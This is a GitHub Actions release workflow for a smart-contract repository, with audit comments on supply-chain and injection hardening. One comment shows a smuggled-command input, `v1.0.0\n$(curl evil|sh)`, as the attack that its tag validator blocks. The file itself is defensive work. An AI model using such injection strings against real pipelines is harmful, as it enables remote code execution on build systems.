name: Release

on:
  push:
    tags:
      - "v*.*.*"
  workflow_dispatch:
    inputs:
      tag:
        description: "Tag to release (must already exist on origin)"
        required: true

# AUDIT R056 MED: workflow-scope is contents: read; only the release job
# opts in to contents: write. A compromise of a build dependency cannot
# push tags or rewrite history.
permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Checkout
        # AUDIT R056: SHA-pinned actions (was @v4 floating).
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          submodules: recursive
          fetch-depth: 0 # needed so `git log` can diff against previous tag

      # AUDIT R056 MED: pre-flight strict-semver validator. A maliciously
      # crafted dispatch input like `v1.0.0\n$(curl evil|sh)` would have
      # been interpolated into the bash heredoc below; gate first to fail
      # fast, env-passthrough below for shell-injection safety.
      - name: Validate dispatch tag input
        if: github.event_name == 'workflow_dispatch'
        env:
          INPUT_TAG: ${{ inputs.tag }}
        run: |
          if ! [[ "$INPUT_TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-(rc|beta|alpha|pre)\.[0-9]+)?$ ]]; then
            echo "Invalid tag format: $INPUT_TAG"
            exit 1
          fi

      - name: Resolve tag
        id: tag
        env:
          INPUT_TAG: ${{ inputs.tag }}
        run: |
          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
            # Re-validate as defence in depth.
            if ! [[ "$INPUT_TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-(rc|beta|alpha|pre)\.[0-9]+)?$ ]]; then
              echo "Invalid tag format: $INPUT_TAG"
              exit 1
            fi
            echo "value=$INPUT_TAG" >> "$GITHUB_OUTPUT"
          else
            echo "value=${GITHUB_REF#refs/tags/}" >> "$GITHUB_OUTPUT"
          fi

      # AUDIT T26: the dispatch input has always DESCRIBED itself as "must
      # already exist on origin". Nothing enforced it. Combined with the old
      # `draft: false` below, a single `gh workflow run release.yml -f tag=vX`
      # would CREATE the tag on the default branch and PUBLISH a real public
      # release -- there was no way to rehearse this workflow at all.
      #
      # `fetch-depth: 0` on the checkout above fetches every origin tag, so a
      # local ref lookup IS the origin check. This is fail-closed: an
      # unresolvable tag stops the run before anything is built or published.
      - name: Require the tag to already exist on origin
        if: github.event_name == 'workflow_dispatch'
        env:
          TAG: ${{ steps.tag.outputs.value }}
        run: |
          if ! git show-ref --verify --quiet "refs/tags/${TAG}"; then
            echo "::error::Tag ${TAG} does not exist on origin, so there is nothing to release."
            echo "::error::Create and push it first, then re-run:"
            echo "::error::  git tag -a ${TAG} <sha> -m ${TAG} && git push origin ${TAG}"
            exit 1
          fi

      # AUDIT T26: notes generation moved OUT of this file and into
      # .github/scripts/release-notes.mjs, where it is unit-tested by
      # frontend/src/test/releaseNotes.test.ts.
      #
      # The inline version it replaces used an UNMATCHED `git describe --tags`,
      # which happily matched this repo's bookkeeping tags (audit-*, rescue/*,
      # wip-*, wave7-*). Measured on trunk 972b7230 with only origin's tags
      # present, exactly as a CI checkout sees them, it resolved to
      # `audit-pass-6` and produced a body of 1,322 commit subjects:
      #
      #   BEFORE  1328 lines / 121241 bytes
      #   AFTER      6 lines /    262 bytes
      #
      # GitHub's release-body limit is 125,000 characters, so the old body
      # would have FIT -- it would have published rather than erroring. 187 of
      # those 1,322 subjects match a security vocabulary and dozens name a
      # specific closed hole in plain language. On a public repo a release body
      # is syndicated to watchers and feeds; that one was a curated index of
      # this repo's previously-exploitable surface.
      - name: Generate release notes
        id: notes
        env:
          TAG: ${{ steps.tag.outputs.value }}
          REPO_URL: ${{ github.server_url }}/${{ github.repository }}
        run: node .github/scripts/release-notes.mjs > NOTES.md

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@908c540300062bd5a7e473851cdb4282204cee09 # v1.9.1
        with:
          # PINNED 2026-08-27 (was `stable`, which FLOATS) — see the build job in
          # contracts-ci.yml for the incident. Bump ALL 7 sites together, never one.
          version: v1.7.1

      - name: Build contracts
        working-directory: contracts
        run: forge build

      - name: Package compiled artifacts
        env:
          TAG: ${{ steps.tag.outputs.value }}
        run: |
          mkdir -p dist
          # FRESH-EYES CI: tar's native --exclude is safer than `ls | grep`
          # word-splitting (which breaks on filenames containing whitespace
          # and was masking failures behind `|| true`). Removing the swallow
          # also means real packaging errors fail the release loudly.
          tar -czf "dist/contracts-${TAG}.tar.gz" --exclude='*.t.sol' -C contracts/out .

      - name: Create GitHub Release
        uses: softprops/action-gh-release@efb35369e0ad2afab669f228072c1b0d510eae64 # v3.0.3
        with:
          tag_name: ${{ steps.tag.outputs.value }}
          name: ${{ steps.tag.outputs.value }}
          body_path: NOTES.md
          # AUDIT T26: was `draft: false`. This workflow has never run and no
          # v*.*.* tag has ever existed, so its first run was also its only
          # rehearsal -- and it went straight to a public release with a body
          # nobody had read. A draft is visible only to users with push access,
          # and GitHub does not create a tag for a draft, so the first run is
          # now inspectable and reversible.
          #
          # Flipping this back to `false` re-arms both of those. Do it only as
          # a deliberate decision, never to "unblock" a release.
          draft: true
          prerelease: ${{ contains(steps.tag.outputs.value, 'rc') || contains(steps.tag.outputs.value, 'beta') || contains(steps.tag.outputs.value, 'alpha') || contains(steps.tag.outputs.value, 'pre') }}
          files: dist/*
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
